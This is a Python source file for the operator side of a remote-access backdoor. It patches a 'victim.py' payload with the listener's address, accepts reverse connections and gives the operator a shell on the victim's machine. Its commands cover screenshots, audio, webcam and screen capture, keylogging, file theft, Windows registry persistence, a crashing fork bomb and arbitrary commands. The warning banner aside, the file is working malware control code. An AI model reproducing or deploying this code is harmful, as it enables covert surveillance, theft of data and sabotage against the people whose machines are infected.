import argparse
import fileinput
import json
import os
import socket
import sys
import termcolor
import py_compile
import hashlib
import hmac
from getpass import getpass
import ssl

# main veriables
BUFFER_SIZE = 4096
AUTH_TIMEOUT = 30

WARNING_BANNER = """
WARNING: This is a security tool. Unauthorized use is illegal.
You must have explicit permission to monitor/target any system.
Misuse may result in criminal penalties.
"""

def print_banner():
    print(termcolor.colored(WARNING_BANNER, 'red'))

def load_auth_key():
    with open('secret.key', 'rb') as f:
        return bytes.fromhex(f.read().decode().strip())

def setup_ssl_context(certfile, keyfile):
    """Set up SSL context for secure communications"""
    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    context.load_cert_chain(certfile=certfile, keyfile=keyfile)
    return context

def authenticate_connection(conn, secret_key):
    try:
        # 1. Send challenge
        challenge = os.urandom(16)
        conn.sendall(challenge)  # Use sendall instead of send
        
        # 2. Receive response
        response = conn.recv(32)
        if not response or len(response) != 32:
            return False
            
        # 3. Verify HMAC
        expected = hmac.new(secret_key, challenge, hashlib.sha256).digest()
        return hmac.compare_digest(response, expected)
        
    except (socket.timeout, ConnectionError) as e:
        print(f"Auth error: {str(e)}")
        return False
    
def modify_backdoor(lhost, port):
    """Safely modify the backdoor configuration"""
    try:
        with open('victim.py', 'r') as f:
            lines = f.readlines()
        
        if len(lines) > 24:
            lines[24] = f'LHOST = "{lhost}";PORT = {port}\n'
        
        with open('backdoor.py', 'w') as f:
            f.writelines(lines)
        print(termcolor.colored("[+] Backdoor file modified successfully", 'green'))
    except (IOError, IndexError) as e:
        print(termcolor.colored(f"[-] Error modifying backdoor: {str(e)}", 'red'))
        sys.exit(1)

def modify_backdoor(LHOST, PORT):
    with open('victim.py', 'r') as f:
        lines = f.readlines()
    lines[24] = f'LHOST = "{LHOST}";PORT = {PORT}\n'
    with open('victim.py', 'w') as f:
        f.writelines(lines)
    print(termcolor.colored("[+] Modifying backdoor file", 'green'))


def reliable_send(conn, data):
    """Securely send JSON data"""
    try:
        jsondata = json.dumps(data)
        conn.send(jsondata.encode())
    except (ConnectionError, TypeError) as e:
        print(termcolor.colored(f"[-] Send error: {str(e)}", 'red'))
        raise


def reliable_recv(conn):
    """Securely receive JSON data"""
    data = ''
    while True:
        try:
            chunk = conn.recv(BUFFER_SIZE).decode().rstrip()
            if not chunk:
                break
            data += chunk
            return json.loads(data)
        except (ValueError, ConnectionError) as e:
            print(termcolor.colored(f"[-] Receive error: {str(e)}", 'red'))
            raise


def upload_file(conn, file_path):
    """Securely upload a file with error handling"""
    try:
        with open(file_path, 'rb') as f:
            while True:
                chunk = f.read(BUFFER_SIZE)
                if not chunk:
                    break
                conn.send(chunk)
        return True
    except (IOError, ConnectionError) as e:
        print(termcolor.colored(f"[-] Upload failed: {str(e)}", 'red'))
        return False


def download_file(conn, file_path):
    """Securely download a file with error handling"""
    try:
        with open(file_path, 'wb') as f:
            # conn.settimeout(5)
            while True:
                chunk = conn.recv(BUFFER_SIZE)
                if not chunk:
                    break
                f.write(chunk)
            conn.settimeout(None)
        return True
    except (IOError, ConnectionError, socket.timeout) as e:
        print(termcolor.colored(f"[-] Download failed: {str(e)}", 'red'))
        return False
    
def handle_command(conn, cmd, client_ip):
    """Process and execute commands with proper error handling and security"""
    global count  # For screenshot/recording counters
    
    try:
        # Parse command into parts
        parts = cmd.split()
        if not parts:
            return True
            
        cmd_base = parts[0].lower()
        cmd_args = parts[1:]

        if cmd_base == 'exit':
            reliable_send(conn, "exit")
            return False
            
        elif cmd_base == 'help':
            print(termcolor.colored("""
Command List:
  exit                - Exit session
  clear               - Clear screen
  help                - Show this help
  screenshot          - Take screenshot
  record <seconds>    - Record audio
  screen_record <on|off> - Record desktop
  sysinfo             - Get system info
  cd <directory>      - Change directory
  upload <file>       - Upload file to target
  download <file>     - Download file from target
  persistence <reg> <file> - Create persistence (Windows only)
  
Dangerous Commands (Require Confirmation):
  forkbomb            - WARNING: System crash
  keylog_start        - Start keylogger
  keylog_dump         - Dump keylogs
  keylog_stop         - Stop keylogger
""", 'blue'))

        elif cmd_base == 'clear':
            os.system('clear' if os.name != 'nt' else 'cls')
            
        elif cmd_base == 'cd':
            if len(cmd_args) != 1:
                print(termcolor.colored("Usage: cd <directory>", 'red'))
            else:
                reliable_send(conn, cmd)
                response = reliable_recv(conn)
                print(response)
                
        elif cmd_base == 'upload':
            if len(cmd_args) != 1:
                print(termcolor.colored("Usage: upload <filename>", 'red'))
            else:
                filename = cmd_args[0]
                if not os.path.exists(filename):
                    print(termcolor.colored(f"[-] File not found: {filename}", 'red'))
                else:
                    reliable_send(conn, cmd)
                    if upload_file(conn, filename):
                        print(termcolor.colored('[+] File uploaded successfully', 'green'))
                        
        elif cmd_base == 'download':
            if len(cmd_args) != 1:
                print(termcolor.colored("Usage: download <filename>", 'red'))
            else:
                reliable_send(conn, cmd)
                filename = cmd_args[0]
                if download_file(conn, filename):
                    print(termcolor.colored('[+] File downloaded successfully', 'green'))
                    
        elif cmd_base == 'screenshot':
            count = 1 
            reliable_send(conn, cmd)
            filename = f"screenshot_{count}.png"
            try:
                with open(filename, 'wb') as f:
                    # conn.settimeout(10)
                    while True:
                        chunk = conn.recv(BUFFER_SIZE)
                        if not chunk:
                            break
                        f.write(chunk)
                    conn.settimeout(None)
                
                os.makedirs("images", exist_ok=True)
                os.replace(filename, f"images/{filename}")
                count += 1
                print(termcolor.colored(f'[+] Screenshot saved as images/{filename}', 'green'))
            except Exception as e:
                print(termcolor.colored(f'[-] Screenshot failed: {str(e)}', 'red'))
                if os.path.exists(filename):
                    os.remove(filename)
                    
        elif cmd_base == 'record':
            if len(cmd_args) != 1 or not cmd_args[0].isdigit():
                print(termcolor.colored("Usage: record <seconds>", 'red'))
            else:
                seconds = int(cmd_args[0])
                if seconds > 300:  # 5 minute limit
                    print(termcolor.colored("[-] Recording limit: 300 seconds", 'red'))
                else:
                    reliable_send(conn, cmd)
                    filename = f"recording_{count}.wav"
                    try:
                        with open(filename, 'wb') as f:
                            conn.settimeout(seconds + 10)
                            while True:
                                chunk = conn.recv(BUFFER_SIZE)
                                if not chunk:
                                    break
                                f.write(chunk)
                            conn.settimeout(None)
                        
                        os.makedirs("recordings", exist_ok=True)
                        os.replace(filename, f"recordings/{filename}")
                        count += 1
                        print(termcolor.colored(f'[+] Recording saved as recordings/{filename}', 'green'))
                    except Exception as e:
                        print(termcolor.colored(f'[-] Recording failed: {str(e)}', 'red'))
                        if os.path.exists(filename):
                            os.remove(filename)
                            
        elif cmd_base == 'screen_record':
            if len(cmd_args) != 1 or cmd_args[0] not in ['on', 'off']:
                print(termcolor.colored("Usage: screen_record <on|off>", 'red'))
            else:
                reliable_send(conn, cmd)
                if cmd_args[0] == 'on':
                    print(termcolor.colored('[+] Screen recording started', 'green'))
                else:
                    print(termcolor.colored('[+] Screen recording stopped', 'green'))
                    
        elif cmd_base == 'webcam':
            if len(cmd_args) != 1 or cmd_args[0] not in ['on', 'off']:
                print(termcolor.colored("Usage: webcam <on|off>", 'red'))
            else:
                reliable_send(conn, cmd)
                if cmd_args[0] == 'on':
                    print(termcolor.colored('[+] Webcam streaming started', 'green'))
                else:
                    print(termcolor.colored('[+] Webcam streaming stopped', 'green'))
                    
        elif cmd_base == 'persistence':
            if len(cmd_args) != 2:
                print(termcolor.colored("Usage: persistence <regname> <filename>", 'red'))
            else:
                reliable_send(conn, cmd)
                response = reliable_recv(conn)
                print(response)
                
        elif cmd_base == 'sysinfo':
            reliable_send(conn, cmd)
            response = reliable_recv(conn)
            print(response)
            
        elif cmd_base == 'forkbomb':
            confirm = input(termcolor.colored("WARNING: This will crash the target system! Confirm (y/n): ", 'red'))
            if confirm.lower() == 'y':
                reliable_send(conn, cmd)
                response = reliable_recv(conn)
                print(response)
            else:
                print(termcolor.colored("[-] Forkbomb cancelled", 'yellow'))
                
        elif cmd_base in ['keylog_start', 'keylog_dump', 'keylog_stop']:
            reliable_send(conn, cmd)
            response = reliable_recv(conn)
            print(response)
            
        else:
            # Handle shell commands
            reliable_send(conn, cmd)
            response = reliable_recv(conn)
            print(response)
            
        return True
        
    except ConnectionError:
        print(termcolor.colored("[-] Connection lost", 'red'))
        return False
    except Exception as e:
        print(termcolor.colored(f"[-] Command error: {str(e)}", 'red'))
        return True
    
def main():
    print_banner()
    
    # Parse arguments
    parser = argparse.ArgumentParser()
    parser.add_argument("-rh", "--rhost", required=True, help="Listening IP")
    parser.add_argument("-lh", "--lhost", required=True, help="Target IP")
    parser.add_argument("-p", "--port", type=int, required=True, help="Port")
    parser.add_argument("-c", "--compile", action="store_true", help="Compile payload")
    parser.add_argument("--cert", help="SSL certificate file")
    parser.add_argument("--key", help="SSL private key file")
    args = parser.parse_args()

    # Generate authentication key
    auth_key = load_auth_key()
    print(termcolor.colored("[*] Generated authentication key", 'blue'))
    
    # Modify backdoor
    modify_backdoor(args.lhost, args.port)
    
    # Compile if requested
    if args.compile:
        try:
            py_compile.compile("backdoor.py")
            print(termcolor.colored("[+] Backdoor compiled successfully", 'green'))
        except py_compile.PyCompileError as e:
            print(termcolor.colored(f"[-] Compilation failed: {str(e)}", 'red'))

    # Set up SSL
    ssl_context = None
    if args.cert and args.key:
        try:
            ssl_context = setup_ssl_context(args.cert, args.key)
            print(termcolor.colored("[+] SSL configured", 'green'))
        except ssl.SSLError as e:
            print(termcolor.colored(f"[-] SSL error: {str(e)}", 'red'))
            sys.exit(1)

    # Start server
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind((args.rhost, args.port))
            sock.listen(5)
            
            print(termcolor.colored(f"[*] Listening on {args.rhost}:{args.port}", 'green'))
            
            while True:
                conn, addr = sock.accept()
                print(termcolor.colored(f"[+] Connection from {addr[0]}:{addr[1]}", 'green'))
                
                # Upgrade to SSL if configured
                if ssl_context:
                    conn = ssl_context.wrap_socket(conn, server_side=True)
                
                # Authenticate
                conn.settimeout(AUTH_TIMEOUT)
                if not authenticate_connection(conn, auth_key):
                    print(termcolor.colored("[-] Authentication failed", 'red'))
                    conn.close()
                    continue
                conn.settimeout(None)
                
                # Command loop
                try:
                    while True:
                        cmd = input(termcolor.colored(f"* Shell~{addr[0]}: ", 'red'))
                        if not handle_command(conn, cmd, addr[0]):
                            break
                except (ConnectionError, KeyboardInterrupt):
                    print(termcolor.colored("[-] Connection closed", 'red'))
                finally:
                    conn.close()
                    
    except KeyboardInterrupt:
        print(termcolor.colored("\n[-] Server shutting down", 'red'))
    except Exception as e:
        print(termcolor.colored(f"[-] Server error: {str(e)}", 'red'))

if __name__ == "__main__":
    main()